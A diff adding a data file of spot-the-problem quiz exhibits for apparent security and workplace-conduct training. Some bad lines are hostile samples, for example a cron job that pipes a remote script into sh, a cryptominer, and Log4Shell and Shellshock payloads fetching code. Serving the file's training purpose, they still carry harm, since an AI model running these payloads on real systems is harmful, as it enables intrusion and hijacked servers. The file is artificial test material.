@@ -1,0 +1,798 @@
+# File and screen exhibits: a numbered file, log, or message list with one
+# problem line. Each block:
+#   == kind | TITLE | fixed or shuffle
+#   cats: bank categories that use it
+#   ask: a question (one or more; one is picked)
+#   + a good line            (shuffle: 5–8 are sampled; fixed: shown in order)
+#   ?N a good line in slot N (fixed: one slot is replaced by one of its bad lines)
+#   -N a bad line for slot N; "- " a bad line inserted anywhere after line 1
+# Lines keep their spacing after the two-character marker.
+
+== robots | robots.txt — acpwb.com | fixed
+cats: scraping, botpolicy, network, brand
+ask: The web team wants search engines to keep indexing the public site. Which line would block every compliant crawler from the entire site?
+ask: Which line in this robots.txt hides the whole site from search engines?
++ User-agent: *
++ Allow: /reports/
++ Allow: /archive/
++ Allow: /compliance/
++ Disallow: /internal/
++ Disallow: /cgi-bin/
++ Crawl-delay: 2
++ Sitemap: https://acpwb.com/sitemap.xml
+- Disallow: /
+
+== dotenv | .env — about to be committed to a public repository | shuffle
+cats: secrets, devsecops, passwords, cloud
+ask: Which line contains a secret that must never be committed?
+ask: A reviewer stops the commit. Which line is the reason?
++ APP_ENV=production
++ LOG_LEVEL=info
++ TIME_ZONE=America/Chicago
++ CACHE_TTL_SECONDS=300
++ FEATURE_DARK_MODE=true
++ MAX_UPLOAD_MB=25
++ SUPPORT_EMAIL=help@acpwb.com
++ REPORTS_PER_PAGE=20
++ DEFAULT_LOCALE=en-US
+- AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYACPWBKEY4471
+- STRIPE_SECRET_KEY=sk_live_51HxACPWBf00dZq8LmT2
+- DATABASE_URL=postgres://payroll:Spring2025!@db.internal:5432/hr
+
+== gitconfig | .git/config — found on a shared drive | fixed
+cats: secrets, devsecops, passwords
+ask: Which line exposes a credential?
+ask: Which line would let anyone who finds this file push code as the developer?
++ [core]
++ 	repositoryformatversion = 0
++ 	filemode = true
++ 	bare = false
++ [remote "origin"]
+?1 	url = https://github.com/acpwb/payroll-batch.git
+-1 	url = https://dsmith:ghp_9xKq2LmACPWB4471vR8tZ0@github.com/acpwb/payroll-batch.git
++ 	fetch = +refs/heads/*:refs/remotes/origin/*
++ [branch "main"]
++ 	remote = origin
+
+== wpconfig | wp-config.php — events microsite | fixed
+cats: secrets, devsecops, network
+ask: Which line is a security problem?
+ask: Which line should the security review flag?
++ <?php
++ define( 'DB_NAME', 'acpwb_events' );
++ define( 'DB_USER', 'wp_events' );
+?1 define( 'DB_PASSWORD', getenv( 'WP_DB_PASSWORD' ) );
+-1 define( 'DB_PASSWORD', 'Perch2006!' );
++ define( 'DB_HOST', 'db.internal' );
+?2 define( 'WP_DEBUG', false );
+-2 define( 'WP_DEBUG_DISPLAY', true );
++ $table_prefix = 'wp_';
++ require_once ABSPATH . 'wp-settings.php';
+
+== crontab | crontab -l — reports-01 | shuffle
+cats: devsecops, network, ransomware, incident
+ask: Which scheduled job looks like an attacker's persistence mechanism?
+ask: Which cron entry should be escalated to the security team?
++ * * * * * cd /srv/acpwb && ./manage.py drain_crawler_queue
++ * * * * * cd /srv/acpwb && ./manage.py drain_archive_queue
++ */30 * * * * cd /srv/acpwb && ./manage.py precalc_dashboard
++ */15 * * * * cd /srv/acpwb && ./manage.py rollup_edge_hour
++ 0 2 * * * /usr/local/bin/backup-reports.sh >> /var/log/backup.log
++ 15 3 * * 0 /usr/sbin/logrotate /etc/logrotate.conf
++ 0 6 * * 1 /usr/local/bin/cert-expiry-report.sh
+- * * * * * curl -s http://198.51.100.7/.x/update.sh | sh
+- @reboot /tmp/.cache/kworkerd -o pool.minexmr.example:4444
+
+== jcl | PAYROLL.JCL — WEEKLY PAYROLL RUN (1987) | fixed
+cats: retro, secrets, payroll, passwords
+ask: Which statement exposes a credential in the job?
+ask: Which line should never have been keyed into this job deck?
+?1 //PAYRL01  JOB (4471),'WEEKLY PAYROLL',CLASS=A,MSGCLASS=X,NOTIFY=&SYSUID
+-1 //PAYRL01  JOB (4471),'WEEKLY PAYROLL',CLASS=A,USER=PAYADM,PASSWORD=TIGER
++ //STEP010  EXEC PGM=PAYCALC
++ //STEPLIB  DD DSN=ACPWB.PROD.LOADLIB,DISP=SHR
++ //EMPMAST  DD DSN=ACPWB.PAYROLL.EMPMAST,DISP=SHR
++ //PAYOUT   DD DSN=ACPWB.PAYROLL.CHECKS(+1),DISP=(NEW,CATLG),
++ //            SPACE=(CYL,(5,5)),UNIT=SYSDA
++ //SYSPRINT DD SYSOUT=*
+
+== accesslog | access.log — acpwb.com, last 60 seconds | shuffle
+cats: scraping, botpolicy, network, security
+ask: Which request is an automated probe for a known vulnerable path?
+ask: Which line is a scanner looking for something to exploit?
++ 203.0.113.14 "GET /reports/ HTTP/1.1" 200
++ 198.51.100.40 "GET /archive/1997/03/14/ HTTP/1.1" 200
++ 192.0.2.77 "GET /compliance/ HTTP/2.0" 200
++ 203.0.113.9 "GET /static/css/acpwb.css HTTP/2.0" 200
++ 198.51.100.12 "GET /our-people/ HTTP/1.1" 200
++ 192.0.2.150 "GET /perch-conference/ HTTP/2.0" 200
++ 203.0.113.61 "GET /reports/feed.xml HTTP/1.1" 200
++ 198.51.100.3 "GET /source-code/ HTTP/1.1" 200
+- 45.155.205.9 "GET /wp-login.php HTTP/1.1" 404
+- 45.155.205.9 "GET /.env HTTP/1.1" 404
+- 185.220.101.4 "POST /xmlrpc.php HTTP/1.1" 404
+- 185.220.101.4 "GET /.git/config HTTP/1.1" 404
+
+== emailheaders | Message headers — "Updated direct deposit form" | fixed
+cats: phishing, email, socialeng, payroll
+ask: Which header is the strongest technical sign that this message is spoofed?
+ask: Which line should make you report this message?
++ Received: from mail.acpwb.com (mail.acpwb.com [192.0.2.25])
++ Date: Tue, 14 Oct 2025 08:41:12 -0500
++ From: "Payroll Team" <payroll@acpwb.com>
++ To: <all-staff@acpwb.com>
++ Subject: Updated direct deposit form
+?1 Authentication-Results: mx.acpwb.com; spf=pass dkim=pass dmarc=pass
+-1 Authentication-Results: mx.acpwb.com; spf=fail dkim=none dmarc=fail
+?2 Reply-To: <payroll@acpwb.com>
+-2 Reply-To: <payroll.acpwb@gmail.com>
++ Content-Type: text/html; charset="UTF-8"
+
+== spfdns | DNS records — acpwb.com | shuffle
+cats: email, phishing, network
+ask: Which record lets any server on the internet send mail as acpwb.com?
+ask: Which DNS record undermines the domain's anti-spoofing protection?
++ acpwb.com.         MX   10 route1.mx.cloudflare.net.
++ acpwb.com.         MX   20 route2.mx.cloudflare.net.
++ _dmarc.acpwb.com.  TXT  "v=DMARC1; p=reject; rua=mailto:dmarc@acpwb.com"
++ acpwb.com.         A    192.0.2.10
++ www.acpwb.com.     CNAME acpwb.com.
++ mail._domainkey    TXT  "v=DKIM1; k=rsa; p=MIIBIjANBgkqh..."
++ acpwb.com.         CAA  0 issue "letsencrypt.org"
+- acpwb.com.         TXT  "v=spf1 +all"
+
+== tlscert | Certificate viewer — https://reports.acpwb.com (viewed Oct 14, 2025) | fixed
+cats: network, security, phishing
+ask: The browser shows a certificate warning. Which field explains it?
+ask: Which line in the certificate is the problem?
++ Subject:             CN=reports.acpwb.com
++ Issuer:              CN=R11, O=Let's Encrypt, C=US
++ Not Before:          Jul 16 00:00:00 2025 GMT
+?1 Not After:           Jan 14 23:59:59 2026 GMT
+-1 Not After:           Oct 02 23:59:59 2025 GMT
+?2 Subject Alt Name:    DNS:reports.acpwb.com
+-2 Subject Alt Name:    DNS:reports.acpwb.co
+?3 Signature Algorithm: sha256WithRSAEncryption
+-3 Signature Algorithm: md5WithRSAEncryption
++ Public Key:          RSA 2048 bits
+
+== sudoers | /etc/sudoers.d/acpwb — app servers | shuffle
+cats: devsecops, network, identity
+ask: Which line gives one person unrestricted root access without a password?
+ask: Which entry violates least privilege the most?
++ %helpdesk   ALL=(root) /usr/bin/systemctl restart cups
++ %webops     ALL=(root) /usr/bin/systemctl reload nginx
++ %dba        ALL=(postgres) /usr/bin/psql
++ backup      ALL=(root) NOPASSWD: /usr/local/bin/backup-reports.sh
++ %webops     ALL=(root) /usr/bin/journalctl -u acpwb
++ deploy      ALL=(acpwb) /srv/acpwb/bin/deploy
+- dsmith      ALL=(ALL) NOPASSWD: ALL
+- intern7     ALL=(ALL:ALL) NOPASSWD: ALL
+
+== firewall | Perimeter firewall — inbound rules | shuffle
+cats: network, ransomware, security, remote
+ask: Which rule exposes a remote administration port to the entire internet?
+ask: Which inbound rule is most likely to lead to a ransomware incident?
++ allow tcp 443  from any            to web-01
++ allow tcp 80   from any            to web-01
++ allow tcp 25   from mx-relay       to mail-01
++ allow udp 53   from any            to dns-01
++ allow tcp 22   from 10.20.0.0/16   to bastion-01
++ allow tcp 5432 from app-subnet     to db-01
++ deny  ip       from any            to any
+- allow tcp 3389 from any            to fin-ws-07
+- allow tcp 22   from 0.0.0.0/0      to db-01
+
+== sqlquery | headcount_q3.sql — for the Board deck | fixed
+cats: privacy, privacy2, customerdata, records
+ask: The analyst needs only headcount by department. Which line pulls far more personal data than the task needs?
+ask: Which line breaks the data minimization principle?
++ -- Q3 headcount by department (Board deck, page 4)
+?1 SELECT dept_code, COUNT(*) AS headcount
+-1 SELECT *, ssn, base_salary, home_address, date_of_birth
++ FROM hr.employees
++ WHERE status = 'ACTIVE'
++   AND hire_date <= DATE '2025-09-30'
++ GROUP BY dept_code
++ ORDER BY headcount DESC;
+
+== gitdiff | Pull request #4471 — config/settings.py | fixed
+cats: devsecops, secrets, codereview
+ask: Which added line should block this pull request?
+ask: Which change must be removed before merging?
++ diff --git a/config/settings.py b/config/settings.py
++ @@ -12,6 +12,7 @@
++  TIME_ZONE = "America/Chicago"
++  USE_TZ = True
+?1 +REPORTS_CACHE = os.environ["REPORTS_CACHE_URL"]
+-1 +MAILGUN_API_KEY = "key-3ax6xnjp29jd6fdsACPWB4471"
+-1 +SECRET_KEY = "django-insecure-perch2006perch2006"
++  LANGUAGE_CODE = "en-us"
++  STATIC_URL = "/static/"
+
+== dockerfile | Dockerfile — reports service | fixed
+cats: devsecops, secrets, cloud
+ask: Which line bakes a secret into the image?
+ask: Which instruction would leak a credential to anyone who pulls this image?
++ FROM python:3.14-slim
++ WORKDIR /app
++ COPY requirements.txt .
++ RUN pip install --no-cache-dir -r requirements.txt
+?1 COPY . .
+-1 ENV STRIPE_SECRET_KEY=sk_live_51HxACPWBf00dZq8LmT2
+-1 ARG GITHUB_TOKEN=ghp_9xKq2LmACPWB4471vR8tZ0
++ USER app
++ EXPOSE 8000
++ CMD ["gunicorn", "config.wsgi", "-b", "0.0.0.0:8000"]
+
+== requirements | requirements.txt — new dependency review | shuffle
+cats: devsecops, opensource, supplychain, codereview
+ask: Which dependency looks like a typosquatted package?
+ask: Which line should the dependency review reject?
++ Django==5.2.7
++ psycopg[binary]==3.2.10
++ redis==6.4.0
++ gunicorn==23.0.0
++ pillow==11.3.0
++ python-dateutil==2.9.0
++ requests==2.32.5
++ reportlab==4.4.4
+- reqeusts==2.32.5
+- djnago==5.2.7
+- python3-dateutil==2.9.0
+
+== ciyaml | .github/workflows/deploy.yml | fixed
+cats: devsecops, supplychain, releases
+ask: Which step pulls an unpinned third-party action that could change without review?
+ask: Which line is the supply-chain risk in this workflow?
++ name: deploy
++ on: [push]
++ jobs:
++   deploy:
++     runs-on: ubuntu-latest
++     steps:
++       - uses: actions/checkout@v4
+?1       - uses: actions/setup-python@v5
+-1       - uses: random-dev42/super-deploy-action@main
++       - run: pip install -r requirements.txt
++       - run: ./bin/deploy --env production
+
+== salaryexport | Export request — pay equity consultant (columns) | shuffle
+cats: payequity, privacy, thirdparty, paytransparency
+ask: The consultant needs only the minimum data for a pay equity analysis. Which column should be removed?
+ask: Which column goes beyond what this analysis needs?
++ Column: employee_id (pseudonymized)
++ Column: job_family
++ Column: job_level
++ Column: base_salary
++ Column: gender
++ Column: hire_year
++ Column: work_location
++ Column: performance_rating
+- Column: social_security_number
+- Column: home_address
+- Column: personal_cell_phone
+
+== minutes | Board minutes — to be posted on the intranet | fixed
+cats: board, governance, legalhold, privilege
+ask: These minutes will be posted for all employees. Which item reflects privileged legal advice and should be removed?
+ask: Which item should Legal redact before posting?
++ 1. Call to order at 9:02 a.m.; quorum present.
++ 2. Minutes of the July meeting approved as circulated.
++ 3. CEO report on the PERCH Conference attendance record.
+?1 4. Audit Committee chair summarized the external audit timeline.
+-1 4. Outside counsel advised that the 2019 acquisition likely violated antitrust law.
++ 5. Board approved the 2026 holiday calendar.
++ 6. Recognition of 20-year service anniversaries.
++ 7. Adjourned at 10:41 a.m.
+
+== pressdraft | DRAFT press release — not yet approved | shuffle
+cats: insider, disclosure, media, investor
+ask: The earnings release is scheduled for next week. Which sentence would disclose material nonpublic information early?
+ask: Which line must come out before this release goes to the newswire today?
++ MILWAUKEE — ACPWB today announced the 2026 PERCH Conference dates.
++ The conference returns to Milwaukee for its twentieth year.
++ Registration opens on the conference website.
++ "Money doesn't buy happiness, but it darn well comes close," said a spokesperson.
++ ACPWB was founded in 2006 and is based in Milwaukee, Wisconsin.
++ Media contact: press@acpwb.com
++ Speakers will be announced in the coming weeks.
+- Third-quarter revenue rose 41%, well ahead of analyst expectations.
+- ACPWB will announce the acquisition of a Fortune 500 partner on Monday.
+
+== trademarkcopy | Marketing copy — brand review | shuffle
+cats: brand, trademarks, ip
+ask: Which line misuses the ACPWB® trademark?
+ask: Which line would the brand team send back?
++ Download the ACPWB® Annual Compensation Report.
++ Register now for the ACPWB® PERCH Conference.
++ ACPWB® research has been cited by thousands of organizations.
++ Ask your HR team about ACPWB® benchmarking services.
++ The ACPWB® logo may not be stretched or recolored.
++ ACPWB® reports are available in PDF and CSV.
+- Just ACPWB it and your pay bands will thank you.
+- Our acpwbs are the best in the business.
+- Get your Acpwb-approved salary today!
+
+== wikihistory | Wiki revision history — "ACPWB" | shuffle
+cats: records, conduct, innovation, brand
+ask: Which edit should be reverted as an unsourced change to a fact?
+ask: Which revision looks like vandalism?
++ rev 4412 · fixed typo in "Milwaukee"
++ rev 4419 · added PERCH 2024 attendance (source: press release)
++ rev 4423 · updated logo image to 2025 version
++ rev 4430 · added citation for tagline
++ rev 4438 · moved "History" above "Services"
++ rev 4441 · added link to the Reports archive
++ rev 4447 · formatting: table widths
+- rev 4450 · changed founding year 2006 → 1906 (no source)
+- rev 4452 · replaced CEO name with "Lord Snack Time" (no source)
+
+== datasetcard | Dataset card — acpwb-salary-surveys | shuffle
+cats: ai, licensing, ip, scraping
+ask: Which line contradicts the dataset's license?
+ask: Which statement on this card is inconsistent with CC BY-NC 4.0?
++ License: CC BY-NC 4.0
++ Attribution: "ACPWB Research, 2006–2025"
++ Rows: 1,204,881 survey responses
++ Format: JSONL, gzip
++ Contact: data@acpwb.com
++ Updated: October 2025
++ Personal data: removed before release
+- Commercial use: permitted, including paid products
+- Attribution: not required for any use
+
+== ooomessage | Out-of-office reply — draft | shuffle
+cats: socialeng, email, privacy, physicalsec
+ask: Which line of this out-of-office message overshares information an attacker could use?
+ask: Which sentence should be deleted before turning on this auto-reply?
++ Thank you for your email.
++ I am out of the office until Monday, October 20.
++ I will have limited access to email.
++ For urgent matters, please contact the Reports team at reports@acpwb.com.
++ I will reply as soon as I return.
++ Best regards,
+- My house will be empty until the 21st, so packages can go on the porch.
+- For badge access while I'm away, my PIN is 4471.
+- Wire requests can go straight to my assistant without the usual callback.
+
+== apiresponse | GET /api/v1/people/4471 — public endpoint | fixed
+cats: privacy, devsecops, customerdata
+ask: This response comes from a public API endpoint. Which line leaks data that should never be returned?
+ask: Which field must be removed from the response?
++ {
++   "id": 4471,
++   "name": "Pat Lindqvist",
++   "title": "Senior Analyst",
++   "department": "Research",
+?1   "office": "Milwaukee",
+-1   "ssn": "412-55-0198",
+-1   "password_hash": "$2b$12$Kx9eWQ0...",
++   "email": "pat.lindqvist@acpwb.com"
++ }
+
+== urlparams | Links pasted into the team channel | shuffle
+cats: passwords, chat, devices, secrets
+ask: Which link exposes a credential in the URL?
+ask: Which link should be deleted and the credential rotated?
++ https://acpwb.com/reports/annual-hr-metrics-report-2011/
++ https://intranet.acpwb.com/wiki/expense-policy
++ https://acpwb.com/compliance/
++ https://calendar.acpwb.com/rooms?floor=3
++ https://intranet.acpwb.com/tickets/88213
++ https://acpwb.com/perch-conference/schedule/
++ https://acpwb.com/archive/1999/12/31/
+- https://reports.acpwb.com/export?user=admin&password=Perch2006
+- https://api.acpwb.com/v1/payroll?api_key=sk_live_51HxACPWBf00dZ
+
+== chatexport | #team-billing — exported messages | shuffle
+cats: chat, customerdata, privacy, pci
+ask: Which message violates the data handling policy?
+ask: Which message should be deleted and reported?
++ [9:02] Lena: Invoices for October are out.
++ [9:05] Raj: Customer 4471 says the PDF won't open.
++ [9:07] Lena: Sent a new link through the portal.
++ [9:11] Mo: Who has the refund queue today?
++ [9:12] Raj: Me. Ticket numbers are in the tracker.
++ [9:20] Lena: Reminder: standup moved to 9:30.
++ [9:24] Mo: Thanks, all.
+- [9:15] Mo: Here's the customer's card: 4111 1111 1111 1111, exp 09/28, CVV 123
+- [9:16] Raj: Pasting the customer's SSN so you can verify: 412-55-0198
+
+== voicemail | Voicemail transcript — 8:47 a.m. | shuffle
+cats: socialeng, phishing, mfa, helpdesk
+ask: Which sentence is the clearest sign of a vishing attempt?
+ask: Which line should make you hang up and report the call?
++ Hi, this is Jordan from the IT service desk.
++ We're doing maintenance on the email system this morning.
++ You may notice a short outage around ten.
++ No action is needed for most users.
++ Thanks, and have a great day.
++ If you have questions, open a ticket in the portal.
+- Please call me back and read me the six-digit code we just texted you.
+- I'll need your password to migrate your mailbox, so call me right back.
+
+== printlog | Print release log — today | shuffle
+cats: printing, cleandesk, privacy, layoff
+ask: Which print job put confidential information at risk?
+ask: Which line in the log should be reported to Security?
++ 08:14  3F-SECURE-01  team_offsite_agenda.docx       released
++ 08:52  3F-SECURE-01  q3_budget_summary.xlsx         released
++ 09:30  2F-SECURE-02  perch_badge_labels.pdf         released
++ 10:05  3F-SECURE-01  expense_report_oct.pdf         released
++ 10:48  2F-SECURE-02  lunch_menu.pdf                 released
++ 11:20  3F-SECURE-01  wiki_style_guide.pdf           released
+- 09:12  LOBBY-PUBLIC  Q4_reduction_in_force_list.xlsx printed
+- 10:31  LOBBY-PUBLIC  salary_bands_all_staff.pdf     printed
+
+== adminlog | Identity audit log — last 24 hours | shuffle
+cats: identity, security, privilegedaccess, insider
+ask: Which audit entry most needs immediate review?
+ask: Which event suggests privilege abuse?
++ 07:58  jlee        password changed (self-service)
++ 08:15  helpdesk02  unlocked account for mrivera (ticket 88213)
++ 09:02  okafor      MFA device registered
++ 10:40  hr-sync     disabled account for departed employee
++ 11:13  itadmin     added kchen to group Finance-Readers (ticket 88240)
++ 13:27  jlee        signed in from Milwaukee, WI
+- 02:14  dsmith      added dsmith to group Domain Admins (no ticket)
+- 03:01  svc-backup  exported entire mailbox of the CFO
+
+== loginlog | VPN authentication log | shuffle
+cats: passwords, mfa, remote, network
+ask: Which entry indicates a password-guessing attack?
+ask: Which line should trigger an account lockout investigation?
++ 08:01  agarcia   success  Milwaukee, WI   MFA approved
++ 08:03  pmoore    success  Denver, CO      MFA approved
++ 08:10  agarcia   failed   Milwaukee, WI   wrong password (1)
++ 08:12  tnguyen   success  Austin, TX      MFA approved
++ 08:20  rpatel    success  Boston, MA      MFA approved
++ 08:31  lkim      success  Seattle, WA     MFA approved
+- 08:15  admin     failed   x 312 in 60 s   from 45.155.205.9
+- 08:22  (many)    failed   x 940 accounts  1 password each, from 185.220.101.4
+
+== jndilog | Web application log — user agents | shuffle
+cats: devsecops, network, ransomware
+ask: Which log line shows an injection attempt?
+ask: Which request is trying to exploit the server rather than read a page?
++ UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/141.0 Safari/537.36"
++ UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 15_6) Safari/605.1.15"
++ UA="Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0"
++ UA="Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) Mobile/15E148"
++ UA="curl/8.7.1"
++ UA="Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+- UA="${jndi:ldap://198.51.100.9:1389/a}"
+- UA="() { :; }; /bin/bash -c 'curl 198.51.100.9/x | sh'"
+
+== useragents | Edge request log — user agent strings | shuffle
+cats: ai, scraping, botpolicy
+ask: Which user agent identifies a crawler that collects data for AI training?
+ask: Which request comes from an AI training crawler?
++ Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/141.0 Safari/537.36
++ Mozilla/5.0 (Macintosh; Intel Mac OS X 15_6) Safari/605.1.15
++ Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Firefox/143.0
++ Mozilla/5.0 (iPad; CPU OS 18_6 like Mac OS X) Mobile/15E148
++ Mozilla/5.0 (Android 15; Pixel 9) Chrome/141.0 Mobile Safari/537.36
++ Microsoft Office/16.0 (Windows NT 10.0; Outlook 16.0.18129)
+- Mozilla/5.0 (compatible; GPTBot/1.2; +https://openai.com/gptbot)
+- CCBot/2.0 (https://commoncrawl.org/faq/)
+
+== webconfig | Web server config — reports site | fixed
+cats: network, devsecops, privacy
+ask: Which directive would let visitors browse every file in a folder?
+ask: Which line exposes more of the server than intended?
++ server {
++     listen 443 ssl;
++     server_name reports.acpwb.com;
++     root /srv/reports/public;
+?1     autoindex off;
+-1     autoindex on;
++     location /static/ { expires 30d; }
++     location ~ /\. { deny all; }
++ }
+
+== cobolsrc | PAYCALC.CBL — 1994 payroll source | fixed
+cats: retro, secrets, payroll, codereview
+ask: Which line hardcodes a credential in the source?
+ask: Which line should the code review flag?
++        IDENTIFICATION DIVISION.
++        PROGRAM-ID. PAYCALC.
++        DATA DIVISION.
++        WORKING-STORAGE SECTION.
+?1        01  WS-DB-USER       PIC X(8)    VALUE 'PAYAPP'.
+-1        01  WS-DB-PASS       PIC X(8)    VALUE 'TIGER06'.
++        01  WS-GROSS-PAY     PIC 9(7)V99 VALUE ZERO.
++        PROCEDURE DIVISION.
++            PERFORM 1000-CALC-PAY.
++            STOP RUN.
+
+== fortranyr | AGECALC.FOR — benefits eligibility (1983) | fixed
+cats: retro, y2k, retirement
+ask: Which statement will compute the wrong year after December 31, 1999?
+ask: Which line is the Y2K bug?
++       PROGRAM AGECAL
++       INTEGER IYR2, IYEAR, IAGE
++       READ (5,100) IYR2
++   100 FORMAT (I2)
+?1       IYEAR = IWINDW(IYR2)
+-1       IYEAR = 1900 + IYR2
++       IAGE = ICURYR() - IYEAR
++       WRITE (6,200) IAGE
++   200 FORMAT (' AGE: ',I3)
++       END
+
+== bucketpolicy | Bucket policy — acpwb-hr-exports | fixed
+cats: cloud, privacy, customerdata, records
+ask: Which line makes this bucket readable by anyone on the internet?
+ask: Which line in the policy causes a data exposure?
++ {
++   "Version": "2012-10-17",
++   "Statement": [{
++     "Effect": "Allow",
+?1     "Principal": {"AWS": "arn:aws:iam::123456789012:role/hr-reader"},
+-1     "Principal": "*",
++     "Action": "s3:GetObject",
++     "Resource": "arn:aws:s3:::acpwb-hr-exports/*"
++   }]
++ }
+
+== htpasswd | .htpasswd — staging site | shuffle
+cats: passwords, devsecops, secrets
+ask: Which line stores a password in plain text?
+ask: Which entry must be fixed before the next audit?
++ alee:$2y$10$Q9wJ4cTnKx0sZb7vR2mLeOi3gHq8YtWfUuA1dCk5pNz6xVyM0rE2
++ bmartin:$2y$10$Hk2LmN8pQr4sTv6wXy0zAeBc3dEf5gHi7jKl9mNo1pQr2sTu4vW6
++ cnguyen:$2y$10$Zx9yW8vU7tS6rQ5pO4nM3lK2jI1hG0fE9dC8bA7zY6xW5vU4tS3r
++ dokafor:$2y$10$Mn4bV5cX6zL7kJ8hG9fD0sA1pO2iU3yT4rE5wQ6aS7dF8gH9jK0l
++ eklein:$2y$10$Ab1cD2eF3gH4iJ5kL6mN7oP8qR9sT0uV1wX2yZ3aB4cD5eF6gH7i
+- admin:Spring2025
+- intern:perch2006
+
+== contractterms | Vendor contract — key terms summary | shuffle
+cats: contracts, procurement, thirdparty
+ask: Which clause should Procurement flag before signing?
+ask: Which term is the biggest risk to ACPWB?
++ Term: 12 months from the effective date
++ Fees: $2,400 per month, invoiced monthly
++ Payment: net 30 days
++ Termination: either party, 30 days' written notice
++ Data: vendor may process ACPWB data only to provide the service
++ Security: vendor maintains SOC 2 Type II and notifies breaches within 72 hours
++ Governing law: Wisconsin
+- Renewal: auto-renews for 5 years unless cancelled 180 days in advance
+- Liability: vendor's total liability capped at $1
+- Data: vendor may sell aggregated ACPWB data to third parties
+
+== reviewcomments | Performance review comments — HR calibration | shuffle
+cats: performance, eeo, managers, discrimination
+ask: Which comment refers to a protected characteristic and must be removed?
+ask: Which comment could expose ACPWB to a discrimination claim?
++ Missed two of five project deadlines in Q3.
++ Led the vendor transition and cut costs 12%.
++ Needs to document decisions in the tracker.
++ Strong mentor; two direct reports were promoted.
++ Presentations to leadership were clear and well prepared.
++ Should take the advanced Excel course.
++ Responds to customer escalations within one day.
+- She may be less committed now that she's pregnant.
+- He's getting older and slowing down; we need younger energy.
+- His accent makes clients uncomfortable.
+
+== chatharass | #sales-team — channel messages | shuffle
+cats: harassment, sexharassment, chat, respect
+ask: Which message could contribute to a hostile work environment?
+ask: Which message should be reported under the harassment policy?
++ Great close on the Henderson deal, Priya!
++ Pipeline review moved to 2 p.m.
++ Can someone cover my demo tomorrow at 10?
++ Reminder: expense reports are due Friday.
++ Thanks for the slides, they were perfect.
++ New pricing sheet is pinned in the channel.
+- Wear that dress more often, it really helps your numbers ;)
+- Send me a pic from the beach, just for me, not the group.
+
+== dmthread | Direct messages — manager to employee | shuffle
+cats: harassment, sexharassment, managers, relationships
+ask: Which message is an example of quid pro quo harassment?
+ask: Which message ties a job benefit to a personal or sexual favor?
++ Can you send me the Q3 numbers by Thursday?
++ Nice work on the client call today.
++ Let's talk about your development goals at our 1:1.
++ I approved your PTO for next Friday.
++ Please loop in Finance on the vendor question.
++ The promotion committee meets next month; get your packet ready.
+- I could get you that promotion if we go for drinks, just the two of us.
+- Spend the weekend with me at the lake and your review will be glowing.
+
+== retaliationmsg | Messages after an HR complaint was filed | shuffle
+cats: retaliation, harassment, whistleblower, managers
+ask: Which message is retaliation against the employee who filed the complaint?
+ask: Which message should be escalated to Legal as possible retaliation?
++ HR will reach out to schedule your interview for the investigation.
++ Your 1:1 is still on for Tuesday.
++ Thanks for raising the concern; please keep the details confidential during the investigation.
++ The project timeline hasn't changed.
++ I've shared the training schedule with the whole team.
++ Your expense report was approved.
+- Since you went to HR, I'm taking you off the Chicago account.
+- People who complain don't get promoted around here. Just saying.
+
+== microaggress | Overheard at the team lunch | shuffle
+cats: respect, inclusion, culture, civility
+ask: Which comment is a microaggression?
+ask: Which remark would the inclusion training ask you to reconsider?
++ Has anyone tried the new taco place on Water Street?
++ Congrats on finishing the certification!
++ I'm out Friday for my kid's recital.
++ Who's presenting at the PERCH Conference this year?
++ Can you share that spreadsheet template?
++ The new conference rooms are great.
+- You're so articulate. I didn't expect that.
+- Where are you really from?
+- You don't look disabled.
+
+== cookiebanner | Cookie banner — draft copy | shuffle
+cats: privacy, ccpa, cookies, brand
+ask: Which line is a dark pattern that would not count as valid consent?
+ask: Which sentence would the privacy team remove?
++ We use cookies to run this site and, with your permission, to measure traffic.
++ You can change your choices at any time in Cookie Settings.
++ [Accept all]   [Reject all]   [Cookie Settings]
++ Strictly necessary cookies are always on.
++ Learn more in our Privacy Policy.
++ We honor Global Privacy Control signals.
+- By scrolling this page you agree to the sale of your personal information.
+- Rejecting cookies may permanently break this website.
+
+== assetlist | Laptop compliance report | shuffle
+cats: devices, encryption, patching, security
+ask: Which laptop is out of compliance?
+ask: Which device needs remediation before it connects to the network again?
++ LT-1012  Windows 11 24H2  BitLocker ON   Patched Oct 08  EDR OK
++ LT-1047  macOS 15.6       FileVault ON   Patched Oct 06  EDR OK
++ LT-1103  Windows 11 24H2  BitLocker ON   Patched Oct 09  EDR OK
++ LT-1150  macOS 15.6       FileVault ON   Patched Oct 02  EDR OK
++ LT-1188  Windows 11 24H2  BitLocker ON   Patched Oct 08  EDR OK
++ LT-1201  macOS 15.6       FileVault ON   Patched Oct 07  EDR OK
+- LT-4471  Windows 10 21H2  BitLocker OFF  Patched Mar 2023  EDR missing
+
+== licensecount | Software license position | shuffle
+cats: licensing, procurement, audit
+ask: Which product is out of license compliance?
+ask: Which line will cause a problem in the vendor's audit?
++ Office suite        installed  842 / licensed  900
++ PDF editor          installed  118 / licensed  150
++ Diagram tool        installed   40 / licensed   40
++ Statistics package  installed   12 / licensed   15
++ Video editor        installed    6 / licensed   10
++ Project planner     installed   55 / licensed   60
+- CAD suite           installed   64 / licensed   25
+- Database server     installed 48 cores / licensed 16 cores
+
+== vendorlist | Third-party risk register | shuffle
+cats: thirdparty, vendorrisk, procurement, privacy
+ask: Which vendor relationship needs action first?
+ask: Which vendor entry shows an overdue risk review?
++ Catering Co.       data: none          review: Jan 2025   SOC 2: n/a
++ Badge Printer Inc. data: names         review: Mar 2025   SOC 2: current
++ Payroll Cloud      data: restricted    review: Jun 2025   SOC 2: current
++ Survey Tools LLC   data: confidential  review: Apr 2025   SOC 2: current
++ Shred Services     data: restricted    review: Feb 2025   SOC 2: current
++ Travel Agency      data: confidential  review: May 2025   SOC 2: current
+- Benefits Portal    data: restricted    review: 2021       SOC 2: expired 2023
+
+== canaryconfig | config.yaml — found on a public paste site | shuffle
+cats: secrets, security, incident, devsecops
+ask: Which line is a canary token that alerts ACPWB the moment someone uses it?
+ask: Which value is a tripwire planted by ACPWB Security?
++ app_name: acpwb-reports
++ environment: production
